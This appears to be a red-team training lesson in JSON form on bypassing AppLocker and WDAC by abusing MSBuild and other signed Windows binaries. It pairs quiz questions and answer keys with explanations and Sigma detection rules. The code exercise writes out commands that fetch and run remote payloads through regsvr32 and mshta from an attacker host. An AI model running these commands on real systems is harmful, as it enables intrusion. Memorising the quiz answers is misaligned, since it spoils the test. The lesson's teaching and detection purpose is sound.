@@ -1,0 +1,134 @@
+{
+  "lesson_number": "1145",
+  "order_index": 50,
+  "domain": "red_team",
+  "difficulty": 2,
+  "title": "Bypassing Application Control with MSBuild",
+  "slug": "bypassing_application_control_with_msbuild",
+  "lesson_id": "be26a006-1c0b-4677-9f72-b417b330d1b6",
+  "module": "SEC560 Section 4",
+  "prerequisites": [],
+  "concepts": [
+    "Application control (AppLocker, WDAC)",
+    "MSBuild as LOLBin",
+    "Inline C# task execution",
+    "AppLocker bypass techniques",
+    "WDAC bypass considerations",
+    "Living Off The Land Binaries (LOLBins)",
+    "Detection of MSBuild abuse",
+    "Defense against LOLBin abuse"
+  ],
+  "estimated_time": 45,
+  "learning_objectives": [
+    "Explain how MSBuild can be abused to bypass application control policies",
+    "Create and execute inline C# tasks via MSBuild to run arbitrary code",
+    "Identify multiple LOLBin techniques for bypassing AppLocker and WDAC",
+    "Configure detection rules for MSBuild abuse in SIEM systems",
+    "Implement defensive measures against LOLBin-based attacks"
+  ],
+  "post_assessment": [
+    {
+      "question": "Why is MSBuild.exe considered a LOLBin?",
+      "options": [
+        "It is malware distributed by Microsoft",
+        "It is a legitimate Microsoft-signed binary that can execute arbitrary C# code from XML project files",
+        "It exploits a zero-day vulnerability in Windows",
+        "It bypasses all network firewalls"
+      ],
+      "correct": 1,
+      "explanation": "MSBuild.exe is a legitimate, Microsoft-signed binary that processes .csproj XML files. Since it can compile and execute inline C# code, attackers use it to run arbitrary code while appearing as a trusted Microsoft process."
+    },
+    {
+      "question": "Which AppLocker rule type is most commonly bypassed by LOLBin techniques?",
+      "options": [
+        "Hash rules",
+        "Path rules (especially default allow rules)",
+        "Publisher rules with strict conditions",
+        "Custom rules with file attribute conditions"
+      ],
+      "correct": 1,
+      "explanation": "Path rules that allow everything in C:\\Windows\\* are trivially bypassed because LOLBins like MSBuild.exe, InstallUtil.exe, and Regsvcs.exe all reside in System32 and are implicitly trusted."
+    },
+    {
+      "question": "What is the primary detection indicator for MSBuild abuse?",
+      "options": [
+        "MSBuild consuming high CPU",
+        "MSBuild.exe executing with network connections or spawning child processes beyond normal compilation",
+        "MSBuild running as SYSTEM",
+        "MSBuild.exe files being modified"
+      ],
+      "correct": 1,
+      "explanation": "Normal MSBuild usage compiles code without network activity or spawning unusual child processes. MSBuild making network connections or spawning cmd.exe/powershell.exe is a strong indicator of abuse."
+    },
+    {
+      "question": "Which defensive approach is most effective against LOLBin abuse?",
+      "options": [
+        "Uninstalling all LOLBins from Windows",
+        "Using WDAC with explicit allow lists rather than AppLocker path-based rules",
+        "Disabling the .NET Framework entirely",
+        "Blocking all Microsoft-signed executables"
+      ],
+      "correct": 1,
+      "explanation": "WDAC (Windows Defender Application Control) with explicit allow lists based on signed/pinned policies is far more resistant to LOLBin bypasses than AppLocker's path-based rules, which can be circumvented by placing payloads in allowed directories."
+    }
+  ],
+  "jim_kwik_principles": [
+    "Association",
+    "Visualization",
+    "Emotion",
+    "Repetition",
+    "Simplification",
+    "Storytelling",
+    "Chunking",
+    "Imagination",
+    "Active Recall",
+    "Teaching Others"
+  ],
+  "tags": [
+    "Course: SANS-SEC560",
+    "Career Path: Red Teamer",
+    "Career Path: Pentester"
+  ],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "title": "The Trusted Become the Weapon",
+      "content": "The most dangerous attack tools aren't malware you download — they're programs already installed on the target. LOLBins (Living Off The Land Binaries) are legitimate Microsoft-signed executables that attackers abuse to run code without dropping foreign files.\n\nMSBuild.exe is the poster child. It's supposed to compile .NET projects. But in a red teamer's hands, it becomes a weapon that bypasses application control, executes arbitrary C# code, and appears completely legitimate to defenders.\n\nUnderstanding LOLBins isn't just offensive — it's essential for blue teamers who need to know what 'normal' looks like."
+    },
+    {
+      "type": "explanation",
+      "title": "MSBuild as an Application Control Bypass",
+      "content": "**What is MSBuild?**\n- Microsoft Build Engine — legitimate .NET build tool\n- Signed by Microsoft — trusted by all application control solutions\n- Processes `.csproj` and `.vbproj` XML project files\n- Can compile and execute **inline C# code** using `<Code>` elements\n\n**Why it bypasses AppLocker:**\n- AppLocker default rules allow all executables in `C:\\Windows\\*\n- MSBuild.exe lives in `C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\`\n- It's Microsoft-signed → publisher rules trust it\n- It executes code from XML files (not .exe) → file extension rules don't apply\n\n**Inline Task Execution:**\nMSBuild's `<UsingTask>` element allows inline C# code within the project file. The C# code compiles in memory and executes — no .exe dropped, no DLL written.\n\n**Other Common LOLBins:**\n- `InstallUtil.exe` — Installs/uninstalls .NET assemblies, can execute code\n- `Regsvcs.exe` / `Regasm.exe` — Register .NET COM components\n- `Regsvr32.exe` — Register DLLs, can load from URL\n- `mshta.exe` — Execute HTA files locally or remotely\n- `certutil.exe` — Download files from internet\n- `bitsadmin.exe` — Background Intelligent Transfer Service\n- `rundll32.exe` — Execute code from DLLs\n- `wmic.exe` — WMI command-line, execute remote commands"
+    },
+    {
+      "type": "explanation",
+      "title": "Teach Me Like I'm 10: LOLBins",
+      "content": "Imagine a school where the security guard checks everyone at the door. If you're not on the list, you can't come in.\n\nBut there are some people who are ALWAYS on the list — the janitor, the principal, the IT guy. They have master keys and can go anywhere.\n\nNow imagine a bad guy dresses up as the janitor. The guard sees the janitor's badge and waves them through. Inside, the 'janitor' does all sorts of bad things.\n\nThat's a LOLBin. It's a program that Windows always trusts (like MSBuild.exe, the 'builder'). The security guard (AppLocker) sees its badge and lets it through. But the builder can be told to do bad things — it just follows instructions, even if those instructions come from a bad guy.\n\nThe fix? Don't just trust the badge. Watch what the 'janitor' does after they get inside."
+    },
+    {
+      "type": "code_exercise",
+      "title": "MSBuild Abuse and Detection",
+      "content": "```powershell\n# === Offensive: MSBuild Execution ===\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.csproj\n\n# Common LOLBins and their abuse vectors:\n# InstallUtil.exe - Install/uninstall .NET assemblies\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll\n\n# Regsvr32.exe - Register DLLs (can load from URL)\nregsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll\n\n# mshta.exe - Execute HTA files\nmshta.exe http://attacker.com/payload.hta\n```\n\n```yaml\n# === Defensive: Sigma Detection Rules ===\n\n# Detect MSBuild spawning unexpected processes\ntitle: MSBuild Spawning Suspicious Processes\nlogsource:\n  product: windows\n  service: sysmon\ndetection:\n  selection:\n    EventID: 1\n    ParentImage|endswith: '\\\\MSBuild.exe'\n    Image|endswith:\n      - '\\\\cmd.exe'\n      - '\\\\powershell.exe'\n      - '\\\\wscript.exe'\n      - '\\\\cscript.exe'\n  condition: selection\nlevel: high\n\ntitle: MSBuild Network Connection\nlogsource:\n  product: windows\n  service: sysmon\ndetection:\n  selection:\n    EventID: 3\n    Image|endswith: '\\\\MSBuild.exe'\n  condition: selection\nlevel: high\n\n# AppLocker hardening: Block MSBuild except in dev paths\n# WDAC policy: Only allow MSBuild from signed, pinned paths\n```"
+    },
+    {
+      "type": "real_world",
+      "title": "Real-World: LOLBins in APT Operations",
+      "content": "**APT29 (Cozy Bear) — MSBuild Usage:**\nAPT29 has consistently used MSBuild.exe to execute C# payloads in their operations. In the SolarWinds supply chain compromise, MSBuild was one of several LOLBins used for lateral movement and payload execution.\n\n**FIN7 — InstallUtil Abuse:**\nFIN7 (Carbanak group) used InstallUtil.exe to execute their payload DLLs, bypassing application control on point-of-sale systems. The technique was so reliable they used it across dozens of restaurant and retail chains.\n\n**Emotet — Regsvr32 Abuse:**\nEmotet used `regsvr32.exe /s /n /u /i:https://... scrobj.dll` to download and execute scriptlets, bypassing both application control and network restrictions (since regsvr32 is a trusted binary making legitimate-looking network connections).\n\n**Detection Success Story:**\nA SOC analyst noticed MSBuild.exe making an outbound HTTPS connection to an unusual domain. Investigation revealed an APT group using MSBuild to execute a C2 beacon. This single detection caught the entire intrusion chain."
+    },
+    {
+      "type": "memory_aid",
+      "title": "Common LOLBins: B.U.I.L.D.",
+      "content": "**B** — BITSAdmin (Background Intelligent Transfer Service — downloads files)\n**U** — Utilman (Utility Manager — privilege escalation on lock screen)\n**I** — InstallUtil (installs .NET assemblies — executes arbitrary code)\n**L** — LSASS (not a LOLBin itself, but credential target)\n**D** — Diskshadow (VSS admin — can execute scripts)\n\nPlus the big three bypass tools:\n- **MSBuild** — Compiles and runs inline C#\n- **Regsvr32** — Registers DLLs, loads from URLs\n- **Mshta** — Executes HTA files from local or remote\n\nB.U.I.L.D. your LOLBin knowledge — or they'll build their attack right past your defenses."
+    },
+    {
+      "type": "reflection",
+      "title": "Audit Your LOLBin Exposure",
+      "content": "Check your environment for LOLBin abuse vectors:\n\n1. **AppLocker audit:** Are default rules allowing `C:\\Windows\\*`?\n2. **MSBuild detection:** Is MSBuild.exe spawning unexpected child processes?\n3. **Network connections:** Are any LOLBins making outbound connections?\n4. **WDAC readiness:** Could you migrate from AppLocker path rules to WDAC explicit allow lists?\n\n```powershell\n# Quick LOLBin audit\nGet-AppLockerPolicy -Effective -ErrorAction SilentlyContinue | Format-List\n\n# Check for MSBuild execution in last 24 hours\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';ID=1} |\n  Where-Object {$_.Message -like '*MSBuild*'} |\n  Select-Object TimeCreated, Message | Format-List\n```\n\nWrite three detection rules for your environment. Focus on: MSBuild network connections, InstallUtil process creation, and Regsvr32 with URL parameters."
+    },
+    {
+      "type": "mindset_coach",
+      "title": "Trust but Verify — and Then Monitor",
+      "content": "Application control isn't dead, but path-based allow lists are on life support. LOLBins prove that trusting binaries based on their location or signature isn't enough.\n\n**The defense evolution:**\n1. **AppLocker path rules** — Easily bypassed (we just demonstrated how)\n2. **AppLocker publisher rules** — Better, but still bypassable with signed LOLBins\n3. **WDAC with explicit allow lists** — Best available, only allows specifically approved binaries\n4. **Behavioral monitoring** — Watch what trusted binaries DO, not just who they ARE\n\nThe most effective defense layers WDAC policies with behavioral detection. MSBuild.exe is allowed to compile code. MSBuild.exe connecting to a C2 server is not. Know the difference."
+    }
+  ]
+}
